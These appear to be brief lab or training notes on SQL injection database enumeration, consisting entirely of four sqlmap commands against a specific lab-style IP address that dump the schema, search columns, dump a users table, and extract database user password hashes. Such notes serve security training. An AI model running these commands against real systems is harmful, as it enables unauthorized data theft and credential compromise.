# Advanced Database Enumeration

## Schema

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --schema
```

## Searching for Data

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -C style --search
```

## Password Cracking

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -D testdb -T users --dump
```

## Password Cracking (Database Users)

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --passwords
```
